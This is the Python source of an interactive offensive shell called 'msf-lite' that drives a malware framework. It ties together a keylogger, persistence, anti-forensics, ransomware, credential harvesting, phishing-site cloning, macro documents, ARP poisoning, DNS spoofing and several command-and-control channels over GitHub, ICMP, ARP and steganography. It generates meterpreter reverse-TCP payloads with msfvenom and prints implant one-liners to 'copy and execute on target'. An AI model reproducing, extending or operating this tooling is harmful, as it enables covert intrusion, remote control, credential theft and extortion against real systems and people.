import argparse
import logging
import sys
import json
import threading
import os
import readline
import shutil
import subprocess
from modules.steganography import encode_image, decode_image, detect_stego
from modules.payload import generate_payload
from modules.network import send_to_server, send_to_telegram
from modules.backdoor import backdoor_listener
from modules.audio_steganography import encode_audio, decode_audio
from modules.polyglot import create_polyglot
from modules.keylogger import start_keylogger
from modules.system import add_persistence, mimic_system_tool, self_delete
from modules.scanner import intelligent_scan
from modules.anti_analysis import run_anti_analysis_checks
from modules.discovery import discover_files
from modules.covert_channel import send_arp_payload, listen_for_payload
from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
from modules.anti_forensics import scorched_earth
from modules.target_manager import add_target, get_target, list_targets
from modules.social_engineering import clone_website, create_macro_doc
from modules.lotl_c2 import lotl_agent
from modules.dga import generate_domains
from modules.backdoor import dga_agent
from modules.social_engineering import clone_website, create_macro_doc
from modules.lotl_c2 import lotl_agent
from modules.ape import unleash_ape
from modules.hare import unleash_hare
from modules.mitm import MITM
from modules.icmp_tunnel import send_icmp_command, icmp_c2_listener
from modules.suggestor import get_suggestions
from modules import stego_c2
from modules.github_c2 import GitHubC2
from modules import persistence
import qrcode
from modules import ransomware
from modules import lotl
from modules import harvester
from modules import recon

# --- Shell State ---
github_c2_instance = None
current_target = None
current_target_ip = None
current_module = None
module_options = {}
prompt = "msf-lite > "
mitm = MITM()
mitm_target = None
mitm_gateway = None

def print_help():
    """Prints the main help menu for the shell."""
    print("\n--- Main Commands ---")
    print("  help              - Show this help menu")
    print("  targets           - List all known targets")
    print("  set <ip/label>    - Set the current target")
    print("  info              - Show information about the current target")
    print("  scan <subnet>     - Run an intelligent scan")
    print("  use <module>      - Select a module (e.g., 'stego/encode')")
    print("  options           - Show options for the current module")
    print("  run               - Execute the current module")
    print("  lure              - Access the social engineering toolkit")
    print("  covert            - Use the ARP covert payload channel")
    print("  mitm              - Access the ARP poisoning toolkit")
    print("  icmp              - Use the ICMP C2 Tunnel")
    print("  generate          - Generate a cross-platform payload (msfvenom)")
    print("  stego_c2          - Use the Steganographic C2 Channel")
    print("  github_c2         - Use the GitHub C2 Channel")
    print("  persist           - Generate a persistence command")
    print("  qrcode            - Generate a QR code for payload delivery")
    print("  ransom            - Run a ransomware simulation")
    print("  lotl              - Generate a Living Off The Land implant")
    print("  recon             - Run a deep reconnaissance scan on a target")
    print("  ape-unleash       - Unleash the APE engine")
    print("  hare-unleash      - Unleash the HARE engine")
    print("  exit              - Exit the shell")

def print_lure_help():
    """Prints the help menu for the lure command."""
    print("\n--- Social-Engineering Toolkit ---")
    print("  lure harvest                       - Start the credential harvesting server")
    print("  lure web <url> [payload_url]       - Clone a website for credential harvesting")
    print("  lure doc <path> <payload_cmd>      - Create an infectious Word document")

def print_covert_help():
    """Prints the help menu for the covert command."""
    print("\n--- ARP Covert Payload Channel ---")
    print("  covert send_cmd <target_ip> <cmd>  - Send a shell command for execution")
    print("  covert send_file <target_ip> <path> - Send a file for execution")
    print("  covert listen [timeout]            - Listen for a raw payload")
    print("  covert generate_listener <path>    - Generate the standalone listener script")


def print_generate_help():
    """Prints the help menu for the generate command."""
    print("\n--- Cross-Platform Payload Generation (msfvenom) ---")
    print("Usage: generate <platform> <lhost> <lport> <output_path>")
    print("\nSupported Platforms:")
    print("  android       - android/meterpreter/reverse_tcp")
    print("  windows       - windows/meterpreter/reverse_tcp")
    print("  linux         - linux/x86/meterpreter/reverse_tcp")
    print("  python        - python/meterpreter/reverse_tcp")
    print("  php           - php/meterpreter/reverse_tcp")

def print_recon_help():
    """Prints the help menu for the recon command."""
    print("\n--- Deep Reconnaissance Scanner (Nmap) ---")
    print("Usage: recon <target_ip>")

def print_lotl_help():
    """Prints the help menu for the lotl command."""
    print("\n--- Living Off The Land (LOTL) Implant Generator ---")
    print("Usage: lotl <os> <c2_url>")
    print("\nSupported OS:")
    print("  windows       - Generates a PowerShell one-liner")
    print("  linux         - Generates a Bash one-liner")

def print_ransom_help():
    """Prints the help menu for the ransom command."""
    print("\n--- Ransomware Simulation ---")
    print("Usage: ransom <directory>")
    print("Warning: This will encrypt all files in the specified directory.")

def print_qrcode_help():
    """Prints the help menu for the qrcode command."""
    print("\n--- QR Code Payload Delivery ---")
    print("Usage: qrcode <url> <output_file.png>")

def print_persist_help():
    """Prints the help menu for the persist command."""
    print("\n--- Persistence Command Generation ---")
    print("Usage: persist <os> <implant_path>")
    print("\nSupported OS:")
    print("  windows")
    print("  linux")

def print_github_c2_help():
    """Prints the help menu for the github_c2 command."""
    print("\n--- GitHub C2 Channel ---")
    print("  github_c2 configure <token> <owner> <repo> - Configure the C2 channel")
    print("  github_c2 generate <path>                  - Generate the standalone implant")
    print("  github_c2 command <cmd>                    - Issue a command to the implant")
    print("  github_c2 output                           - Retrieve the latest command output")

def print_stego_c2_help():
    """Prints the help menu for the stego_c2 command."""
    print("\n--- Steganographic C2 Channel ---")
    print("  stego_c2 start              - Start the C2 server")
    print("  stego_c2 generate <path>    - Generate the standalone implant")
    print("  stego_c2 command <cmd>      - Set the command for the implant to execute")

def print_icmp_help():
    """Prints the help menu for the icmp command."""
    print("\n--- ICMP C2 Tunnel ---")
    print("  icmp generate <path>      - Generate the standalone implant")
    print("  icmp listen [timeout]     - Start the C2 listener")
    print("  icmp send <ip> <cmd>      - Send a command to an implant")

def print_mitm_help():
    """Prints the help menu for the mitm command."""
    print("\n--- Man-in-the-Middle Toolkit ---")
    print("  mitm scan <subnet>                     - Scan for live hosts on the local network")
    print("  mitm poison <target_ip> <gateway_ip>    - Start ARP poisoning")
    print("  mitm dns <domain> <fake_ip>            - Start DNS spoofing (requires ARP poisoning)")
    print("  mitm stop                              - Stop all MITM attacks")

def print_module_options():
    """Prints the options for the currently selected module."""
    global current_module
    if not current_module:
        print("No module selected. Use 'use <module_name>'.")
        return

    print(f"\n--- Options for {current_module} ---")
    if current_module == "stego/encode":
        print("  payload   <string>  - The message or file to hide (required)")
        print("  output    <path>    - The output image path (required)")
        print("  RHOST     <ip/label>- The target image file (uses current target if set)")
    else:
        print("This module has no configurable options.")

def run_lure_command(args):
    """Handles the lure command and its subcommands."""
    if not args:
        print_lure_help()
        return

    lure_command = args[0]
    lure_args = args[1:]

    if lure_command == "harvest":
        harvester.run_harvester_server()
    elif lure_command == "web":
        if not 1 <= len(lure_args) <= 2:
            print("Usage: lure web <url> [payload_url]")
            return

        url = lure_args[0]
        payload_url = lure_args[1] if len(lure_args) == 2 else None
        harvester_url = "http://0.0.0.0:8000/harvest" # Assuming harvester runs on this

        clone_website(url, harvester_url, payload_url)
    elif lure_command == "doc":
        if len(lure_args) < 2:
            print("Usage: lure doc <output_path> <payload_cmd>")
            return
        output_path = lure_args[0]
        payload_cmd = " ".join(lure_args[1:])
        create_macro_doc(output_path, payload_cmd)
    else:
        print(f"Unknown lure command: {lure_command}")
        print_lure_help()

def run_covert_command(args):
    """Handles the covert command and its subcommands."""
    if not args:
        print_covert_help()
        return

    covert_command = args[0]
    covert_args = args[1:]

    if covert_command == "send_cmd":
        if len(covert_args) < 2:
            print("Usage: covert send_cmd <target_ip> <command>")
            return
        target_ip = covert_args[0]
        command = " ".join(covert_args[1:])
        send_arp_payload(target_ip, command, payload_type="SHELL_COMMAND")
    elif covert_command == "send_file":
        if len(covert_args) != 2:
            print("Usage: covert send_file <target_ip> <filepath>")
            return
        target_ip, filepath = covert_args
        if not os.path.exists(filepath):
            print(f"Error: File not found at {filepath}")
            return
        with open(filepath, 'rb') as f:
            file_data = f.read()

        # Simple check for ELF or PE to determine if it's an executable
        payload_type = "EXECUTABLE" if file_data.startswith(b'\x7fELF') or file_data.startswith(b'MZ') else "RAW"
        send_arp_payload(target_ip, file_data, payload_type=payload_type)
    elif covert_command == "listen":
        timeout = int(covert_args[0]) if covert_args else 60
        payload, payload_type = listen_for_payload(timeout)
        if payload:
            print(f"Received {payload_type} payload ({len(payload)} bytes).")
            # For simplicity, just print raw data. In a real scenario, you might save it.
            print(payload.decode(errors='ignore'))
    elif covert_command == "generate_listener":
        if len(covert_args) != 1:
            print("Usage: covert generate_listener <output_path>")
            return
        output_path = covert_args[0]
        try:
            shutil.copyfile("covert_listener.py", output_path)
            print(f"Listener script generated at {output_path}")
        except Exception as e:
            print(f"Error generating listener: {e}")
    else:
        print(f"Unknown covert command: {covert_command}")
        print_covert_help()

def run_generate_command(args):
    """Handles the generate command and its subcommands."""
    if len(args) != 4:
        print_generate_help()
        return

    platform, lhost, lport, output_path = args

    payloads = {
        "android": "android/meterpreter/reverse_tcp",
        "windows": "windows/meterpreter/reverse_tcp",
        "linux": "linux/x86/meterpreter/reverse_tcp",
        "python": "python/meterpreter/reverse_tcp",
        "php": "php/meterpreter/reverse_tcp",
    }

    if platform not in payloads:
        print(f"Error: Unsupported platform '{platform}'.")
        print_generate_help()
        return

    payload = payloads[platform]

    print(f"Generating payload for {platform}...")
    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_path}"

    try:
        subprocess.run(command, shell=True, check=True)
        print(f"Payload successfully generated at {output_path}")
    except FileNotFoundError:
        print("Error: msfvenom is not installed or not in your PATH. Please install Metasploit Framework.")
    except subprocess.CalledProcessError as e:
        print(f"Error generating payload: {e}")

def run_recon_command(args):
    """Handles the recon command and its subcommands."""
    if len(args) != 1:
        print_recon_help()
        return

    target_ip = args[0]

    results = recon.run_nmap_scan(target_ip)

    if results:
        print(f"\n--- Reconnaissance Report for {target_ip} ---")
        print(f"  OS Guess: {results['os']}")
        print("\n  Open Ports:")
        for port in results['ports']:
            print(f"    - Port {port['port']}/{port['protocol']}:")
            print(f"      Service: {port['service']}")
            print(f"      Product: {port.get('product', 'N/A')}")
            print(f"      Version: {port.get('version', 'N/A')}")
            if 'vulnerabilities' in port:
                print("      Vulnerabilities:")
                for vuln in port['vulnerabilities']:
                    print(f"        - {vuln}")
        print("---------------------------------")

def run_lotl_command(args):
    """Handles the lotl command and its subcommands."""
    if len(args) != 2:
        print_lotl_help()
        return

    os_type, c2_url = args

    if os_type.lower() == "windows":
        oneliner = lotl.generate_powershell_oneliner(c2_url)
        print("\n--- Windows PowerShell LOTL Implant (copy and execute on target) ---")
        print(oneliner)
    elif os_type.lower() == "linux":
        oneliner = lotl.generate_bash_oneliner(c2_url)
        print("\n--- Linux Bash LOTL Implant (copy and execute on target) ---")
        print(oneliner)
    else:
        print(f"Error: Unsupported OS '{os_type}'.")
        print_lotl_help()

def run_ransom_command(args):
    """Handles the ransom command and its subcommands."""
    if len(args) != 1:
        print_ransom_help()
        return

    directory = args[0]

    # Safety check
    if directory not in ["/tmp/test_encryption", "./test_encryption"]:
        print("Error: For safety, this simulation can only be run on '/tmp/test_encryption' or './test_encryption'.")
        return

    print(f"Running ransomware simulation on {directory}...")
    result = ransomware.run_ransomware_simulation(directory)
    print(result)

def run_qrcode_command(args):
    """Handles the qrcode command and its subcommands."""
    if len(args) != 2:
        print_qrcode_help()
        return

    url, output_file = args

    try:
        img = qrcode.make(url)
        img.save(output_file)
        print(f"QR code saved to {output_file}")
    except Exception as e:
        print(f"Error generating QR code: {e}")

def run_persist_command(args):
    """Handles the persist command and its subcommands."""
    if len(args) != 2:
        print_persist_help()
        return

    os_type, implant_path = args

    if os_type.lower() == "windows":
        command = persistence.generate_windows_persistence(implant_path)
        print("\n--- Windows Persistence Command (copy and send to implant) ---")
        print(command)
    elif os_type.lower() == "linux":
        command = persistence.generate_linux_persistence(implant_path)
        print("\n--- Linux Persistence Command (copy and send to implant) ---")
        print(command)
    else:
        print(f"Error: Unsupported OS '{os_type}'.")
        print_persist_help()

def run_github_c2_command(args):
    """Handles the github_c2 command and its subcommands."""
    global github_c2_instance
    if not args:
        print_github_c2_help()
        return

    command = args[0]
    command_args = args[1:]

    if command == "configure":
        if len(command_args) != 3:
            print("Usage: github_c2 configure <token> <repo_owner> <repo_name>")
            return
        token, owner, repo = command_args
        github_c2_instance = GitHubC2(token, owner, repo)
        print("GitHub C2 configured successfully.")
    elif command == "generate":
        if not github_c2_instance:
            print("Error: Please configure the C2 channel first with 'github_c2 configure'.")
            return
        if len(command_args) != 1:
            print("Usage: github_c2 generate <output_path>")
            return
        output_path = command_args[0]
        try:
            with open("github_implant.py", "r") as f:
                implant_code = f.read()

            implant_code = implant_code.replace("{GIT_TOKEN}", github_c2_instance.token)
            implant_code = implant_code.replace("{REPO_OWNER}", github_c2_instance.repo_owner)
            implant_code = implant_code.replace("{REPO_NAME}", github_c2_instance.repo_name)

            with open(output_path, "w") as f:
                f.write(implant_code)
            print(f"Implant generated at {output_path}")

        except Exception as e:
            print(f"Error generating implant: {e}")
    elif command == "command":
        if not github_c2_instance:
            print("Error: Please configure the C2 channel first.")
            return
        if not command_args:
            print("Usage: github_c2 command <command_to_issue>")
            return
        full_command = " ".join(command_args)
        github_c2_instance.issue_command(full_command)
    elif command == "output":
        if not github_c2_instance:
            print("Error: Please configure the C2 channel first.")
            return
        output = github_c2_instance.get_output()
        print(f"\n--- C2 Output ---\n{output}\n--- End Output ---")
    else:
        print(f"Unknown github_c2 command: {command}")
        print_github_c2_help()

def run_stego_c2_command(args):
    """Handles the stego_c2 command and its subcommands."""
    if not args:
        print_stego_c2_help()
        return

    command = args[0]
    command_args = args[1:]

    if command == "start":
        stego_c2.run_server()
    elif command == "generate":
        if len(command_args) != 1:
            print("Usage: stego_c2 generate <output_path>")
            return
        output_path = command_args[0]
        try:
            shutil.copyfile("stego_implant.py", output_path)
            print(f"Implant generated at {output_path}")
        except Exception as e:
            print(f"Error generating implant: {e}")
    elif command == "command":
        if not command_args:
            print("Usage: stego_c2 command <command_to_execute>")
            return
        full_command = " ".join(command_args)
        if stego_c2.set_command(full_command):
            print(f"C2 command set to: {full_command}")
        else:
            print("Failed to set C2 command.")
    else:
        print(f"Unknown stego_c2 command: {command}")
        print_stego_c2_help()

def run_icmp_command(args):
    """Handles the icmp command and its subcommands."""
    if not args:
        print_icmp_help()
        return

    icmp_command = args[0]
    icmp_args = args[1:]

    if icmp_command == "generate":
        if len(icmp_args) != 1:
            print("Usage: icmp generate <output_path>")
            return
        output_path = icmp_args[0]
        try:
            shutil.copyfile("icmp_implant.py", output_path)
            print(f"Implant generated at {output_path}")
        except Exception as e:
            print(f"Error generating implant: {e}")
    elif icmp_command == "listen":
        timeout = int(icmp_args[0]) if icmp_args else 60
        icmp_c2_listener(timeout)
    elif icmp_command == "send":
        if len(icmp_args) < 2:
            print("Usage: icmp send <target_ip> <command>")
            return
        target_ip = icmp_args[0]
        command = " ".join(icmp_args[1:])
        send_icmp_command(target_ip, command)
    else:
        print(f"Unknown icmp command: {icmp_command}")
        print_icmp_help()

def run_mitm_command(args):
    """Handles the mitm command and its subcommands."""
    global mitm_target, mitm_gateway
    if not args:
        print_mitm_help()
        return

    mitm_command = args[0]
    mitm_args = args[1:]

    if mitm_command == "scan":
        if len(mitm_args) != 1:
            print("Usage: mitm scan <subnet>")
            return
        subnet = mitm_args[0]
        hosts = mitm.arp_scan(subnet)
        print("\n--- Live Hosts ---")
        for host in hosts:
            print(f"  IP: {host['ip']:<15} MAC: {host['mac']}")
    elif mitm_command == "poison":
        if len(mitm_args) != 2:
            print("Usage: mitm poison <target_ip> <gateway_ip>")
            return
        mitm_target, mitm_gateway = mitm_args
        mitm.start_arp_poisoning(mitm_target, mitm_gateway)
    elif mitm_command == "dns":
        if len(mitm_args) != 2:
            print("Usage: mitm dns <domain> <fake_ip>")
            return
        domain, fake_ip = mitm_args
        rules = {f"{domain}.": fake_ip} # Add a trailing dot for FQDN
        mitm.start_dns_spoof(rules)
    elif mitm_command == "stop":
        if mitm.poisoning:
            mitm.stop_arp_poisoning(mitm_target, mitm_gateway)
            mitm_target = None
            mitm_gateway = None
        if mitm.dns_spoofing:
            mitm.stop_dns_spoof()
        if not mitm.poisoning and not mitm.dns_spoofing:
            print("No MITM attacks are currently active.")
    else:
        print(f"Unknown mitm command: {mitm_command}")
        print_mitm_help()

def process_command(cmd_line):
    """Processes a single command line."""
    global current_target, current_module, module_options, prompt, current_target_ip
    parts = cmd_line.split()
    if not parts:
        return

    command = parts[0].lower()
    args = parts[1:]

    if command == "exit":
        return "exit"
    elif command == "help":
        print_help()
    elif command == "targets":
        targets = list_targets()
        if not targets:
            print("No targets found. Run a scan to discover hosts.")
        else:
            print("\n--- Known Targets ---")
            for ip, data in targets.items():
                print(f"  IP: {ip:<15} Label: {data.get('label', 'N/A'):<15} OS: {data.get('os', 'Unknown')}")
    elif command == "set":
        # Try to set a target if only one argument is provided
        if len(args) == 1:
            target_id = args[0]
            target_data = get_target(target_id)
            if target_data:
                target_ip = None
                if target_id in list_targets(): # It was an IP
                    target_ip = target_id
                else: # It was a label
                    for ip, data in list_targets().items():
                        if data.get("label") == target_id:
                            target_ip = ip
                            break

                if target_ip:
                    current_target = target_data
                    current_target_ip = target_ip
                    prompt = f"msf-lite ({target_ip}) > "
                    print(f"Current target set to: {target_ip}")
                else:
                    # This case should ideally not be reached if get_target works correctly
                    print(f"Error: Could not determine IP for target '{target_id}'.")
            else:
                print(f"Target '{target_id}' not found. If setting a module option, use 'set <option> <value>'.")

        # Handle setting module options
        elif len(args) >= 2:
            option_name = args[0].lower()
            option_value = " ".join(args[1:])
            module_options[option_name] = option_value
            print(f"{option_name} => {option_value}")
        else:
            print("Usage: set <ip/label>  OR  set <option> <value>")

    elif command == "info":
        if current_target and current_target_ip:
            print("\n--- Target Information ---")
            print(f"  IP: {current_target_ip}")
            for key, value in current_target.items():
                # Don't print the IP again if it's in the dict
                if key.lower() != 'ip':
                    print(f"  {key.capitalize()}: {value}")
        else:
            print("No target selected. Use 'set <ip/label>' to select one.")
    elif command == "scan":
        if not args:
            print("Usage: scan <subnet>")
        else:
            subnet = args[0]
            print(f"Running intelligent scan on {subnet}...")
            results = intelligent_scan(subnet)
            for host in results:
                add_target(host['ip'], open_ports=host['open_ports'])
            print("Scan complete. Use 'targets' to see the results.")
    elif command == "use":
        if args:
            current_module = args[0]
            prompt = f"msf-lite ({current_module}) > "
        else:
            print("Usage: use <module_name>")
    elif command == "options":
        print_module_options()
    elif command == "run":
        if not current_module:
            print("No module selected.")
            return

        if current_module == "stego/encode":
            payload = module_options.get("payload")
            output = module_options.get("output")
            rhost = module_options.get("rhost")

            if not all([payload, output, rhost]):
                print("Missing required options. Use 'options' to see what's needed.")
                return

            target_info = get_target(rhost)
            if not target_info:
                print(f"Target '{rhost}' not found.")
                return

            input_path = [ip for ip, data in list_targets().items() if data == target_info][0]

            print(f"Running stego/encode on {input_path}...")
            encode_image(input_path, payload, output)
            print("Module execution finished.")
    elif command == "lure":
        run_lure_command(args)
    elif command == "covert":
        run_covert_command(args)
    elif command == "mitm":
        run_mitm_command(args)
    elif command == "icmp":
        run_icmp_command(args)
    elif command == "generate":
        run_generate_command(args)
    elif command == "stego_c2":
        run_stego_c2_command(args)
    elif command == "github_c2":
        run_github_c2_command(args)
    elif command == "persist":
        run_persist_command(args)
    elif command == "qrcode":
        run_qrcode_command(args)
    elif command == "ransom":
        run_ransom_command(args)
    elif command == "lotl":
        run_lotl_command(args)
    elif command == "recon":
        run_recon_command(args)
    elif command == "ape-unleash":
        # ... (ape-unleash logic)
        pass
    elif command == "hare-unleash":
        # ... (hare-unleash logic)
        pass
    else:
        print(f"Unknown command: {command}")

def main():
    """The main interactive loop for the shell."""
    global prompt
    last_command = ""
    print("--- Welcome to the Advanced Security Framework ---")
    print("Type 'help' for a list of commands.")

    # Initial suggestions
    suggestions = get_suggestions("", list_targets(), current_target)
    print("\n💡 Suggestions:")
    for sug in suggestions:
        print(f"   - {sug}")

    if not sys.stdout.isatty():
        # Non-interactive mode
        for line in sys.stdin:
            cmd_line = line.strip()
            if not cmd_line:
                continue
            last_command = cmd_line
            if process_command(cmd_line) == "exit":
                break
    else:
        # Interactive mode
        while True:
            try:
                cmd_line = input(f"\n{prompt}")
                last_command = cmd_line
                if process_command(cmd_line) == "exit":
                    break

                # Show suggestions after each command
                suggestions = get_suggestions(last_command, list_targets(), current_target)
                print("\n💡 Suggestions:")
                for sug in suggestions:
                    print(f"   - {sug}")

            except KeyboardInterrupt:
                print("\nUse 'exit' to leave the shell.")
            except Exception as e:
                logging.error(f"An error occurred in the shell: {e}")

if __name__ == "__main__":
    main()
